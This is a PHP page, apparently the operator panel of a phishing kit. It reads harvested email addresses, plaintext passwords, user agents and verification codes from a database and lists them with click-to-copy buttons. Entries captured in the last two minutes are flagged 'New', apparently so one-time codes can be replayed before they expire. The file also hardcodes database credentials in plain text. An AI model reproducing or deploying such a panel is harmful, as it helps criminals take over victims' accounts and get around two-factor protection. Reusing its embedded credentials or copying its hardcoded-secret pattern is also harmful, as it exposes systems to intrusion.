<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Database connection details
$host = 'sql202.infinityfree.com';
$user = 'if0_37694885';
$password = '0YN3dToFeBfy4';
$dbname = 'if0_37694885_erosdatabase1';

// Connect to the database
$conn = new mysqli($host, $user, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Query to fetch data from "ananda" table
$query_ananda = "
    SELECT 'ananda' AS source, email, password, user_agent, created_at 
    FROM ananda 
    ORDER BY created_at DESC";
$result_ananda = $conn->query($query_ananda);

// Query to fetch data from "verification_codes" table
$query_codes = "
    SELECT 'verification_codes' AS source, code, NULL AS email, NULL AS password, NULL AS user_agent, created_at 
    FROM verification_codes 
    ORDER BY created_at DESC";
$result_codes = $conn->query($query_codes);

// Merge data from both tables into a single array
$data = [];
if ($result_ananda->num_rows > 0) {
    while ($row = $result_ananda->fetch_assoc()) {
        $data[] = $row;
    }
}
if ($result_codes->num_rows > 0) {
    while ($row = $result_codes->fetch_assoc()) {
        $data[] = $row;
    }
}

// Sort the combined data by `created_at` in descending order
usort($data, function ($a, $b) {
    return strtotime($b['created_at']) - strtotime($a['created_at']);
});

// Current timestamp
$current_time = time(); // Get current time as a Unix timestamp

// Display the sorted data
echo "<div style='font-family: Arial, sans-serif; line-height: 1.4; font-size: 12px; background-color: #000; color: #fff; padding: 20px;'>";

foreach ($data as $index => $row) {
    $time_diff = $current_time - strtotime($row['created_at']);
    $status = ($time_diff <= 120) ? "New" : "Old";

    // Display each field as a separate line with click-to-copy functionality
    echo "<div style='margin-bottom: 15px; border: 1px solid #444; padding: 10px; border-radius: 5px; background-color: #111;'>";

    if ($row['source'] === 'ananda') {
        echo "<span onclick='copyText(\"" . htmlspecialchars($row['email']) . "\")' style='cursor: pointer; display: block;'>Email: " . htmlspecialchars($row['email']) . "</span>";
        echo "<span onclick='copyText(\"" . htmlspecialchars($row['password']) . "\")' style='cursor: pointer; display: block;'>Password: " . htmlspecialchars($row['password']) . "</span>";
        echo "<span onclick='copyText(\"" . htmlspecialchars($row['user_agent']) . "\")' style='cursor: pointer; display: block;'>User Agent: " . htmlspecialchars($row['user_agent']) . "</span>";
    } elseif ($row['source'] === 'verification_codes') {
        echo "<span onclick='copyText(\"" . htmlspecialchars($row['code']) . "\")' style='cursor: pointer; display: block;'>Code: " . htmlspecialchars($row['code']) . "</span>";
    }
    echo "<span onclick='copyText(\"" . htmlspecialchars($row['created_at']) . "\")' style='cursor: pointer; display: block;'>Created At: " . htmlspecialchars($row['created_at']) . "</span>";
    echo "<span onclick='copyText(\"" . htmlspecialchars($status) . "\")' style='cursor: pointer; display: block;'>Status: " . htmlspecialchars($status) . "</span>";

    echo "</div>";
}

echo "</div>";

?>

<script>
// JavaScript function to copy only the value (not the label)
function copyText(value) {
    navigator.clipboard.writeText(value).then(() => {
        alert("Copied: " + value);
    }).catch(err => {
        console.error("Failed to copy text: ", err);
    });
}
</script>
